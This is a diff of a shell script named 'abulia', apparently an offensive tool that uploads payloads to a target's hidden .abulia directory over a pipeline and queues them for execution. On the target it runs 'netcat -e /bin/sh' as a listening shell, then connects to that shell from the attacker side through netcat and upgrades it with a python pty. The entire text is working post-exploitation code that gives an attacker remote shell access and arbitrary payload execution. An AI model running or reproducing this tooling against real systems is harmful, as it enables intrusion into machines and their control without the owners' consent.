@@ -9,10 +9,12 @@
 #   - Opening a pipeline between the attacker and the target.
 #   - Immediately begin uploading individual payloads to the target to
 #     $PWD/.abulia on the target system
-#   - Immediately execute payloads marked for execution.
-#     Targets may collaboratively generate a $PWD/.abulia/abuliarc
-#   - Open a reverse python-shell via a different pipeline that then sources
-#     $PWD/.abulia/abuliarc
+#   - Generates a $PWD/.abulia/payloadrc that contains instructions for
+#     individual payloads to be executed.
+#   - Opens a reverse python-shell via a different pipeline that then sources 
+#     $PWD/.abulia/payloadrc, executing individual payloads. These payloads
+#     may directly write to the $PWD/.abulia/abuliarc, which is executed after
+#     every payload.
 #
 # Payloads are marked for execution by prepending them with a '+' on the
 # command line.
@@ -91,12 +93,12 @@ mkpayload(){
 }
 
 ################################################################################
-# Mark payload as executable, then execute it.
+# Mark payload as executable, rendering it to-be-executed when a shell opens.
 ################################################################################
 payloadsh(){
 	echo "chmod +x ./$1">> "$2"
-	echo "sh -c ./$1">> "$2" &
-	echo "[.] payloadsh> executing '$1'" 1>&2;
+	echo "echo 'sh -c $ABULIA_TARGET/$1' >>'payloadrc'">> "$2" &
+	echo "[.] payloadsh> execution for '$1' set." 1>&2;
 }
 
 ################################################################################
@@ -122,9 +124,10 @@ ABULIA_FIFO=$(mkpipeline);
 mkabulia	$ABULIA_HOST	$ABULIA_PORT	$ABULIA_FIFO;
 
 ################################################################################
-# 'abuliarc' is a required payload.
+# 'abuliarc' and `payloadrc` are required payloads.
 ################################################################################
 mkpayload	"abuliarc"	$ABULIA_HOST	$ABULIA_TRANSFER 	$ABULIA_FIFO
+mkpayload	"payloadrc"	$ABULIA_HOST	$ABULIA_TRANSFER	$ABULIA_FIFO
 
 ################################################################################
 # Cycle through individual payloads, loading them as needed.
@@ -152,7 +155,6 @@ done;
 echo "[@] abulia> payloads executed; attempting reshell on port $ABULIA_SHELL"
 
 echo "netcat -e /bin/sh -vlp $ABULIA_SHELL &" > "$ABULIA_FIFO";
-sleep 1s;
 
 echo "[@] abulia> netcat running on target. Removing FIFOs..." 
 rm -f "$ABULIA_FIFO"
@@ -163,5 +165,5 @@ WIDTH=$(stty size  | cut -d ' ' -f 2)
 HEIGHT=$(stty size | cut -d ' ' -f 1)
 
 stty raw -echo;
-cat <(echo "stty raw -echo; cd ..; python -c 'import pty; pty.spawn(\"/bin/bash\")'") <(echo -e "stty size rows $HEIGHT cols $WIDTH 2>/dev/null; export ABULIA_LOCATION='$ABULIA_TARGET'; source '$ABULIA_TARGET/abuliarc'; stty -raw echo 2>/dev/null;") - | netcat "$ABULIA_HOST" "$ABULIA_SHELL";
+cat <(echo "stty raw -echo; cd ..; python -c 'import pty; pty.spawn(\"/bin/bash\")'") <(echo -e "stty size rows $HEIGHT cols $WIDTH 2>/dev/null; export ABULIA_LOCATION='$ABULIA_TARGET'; sh '$ABULIA_TARGET/payloadrc' ; source '$ABULIA_TARGET/abuliarc'; stty -raw echo 2>/dev/null;") - | netcat "$ABULIA_HOST" "$ABULIA_SHELL";
 stty -raw echo;
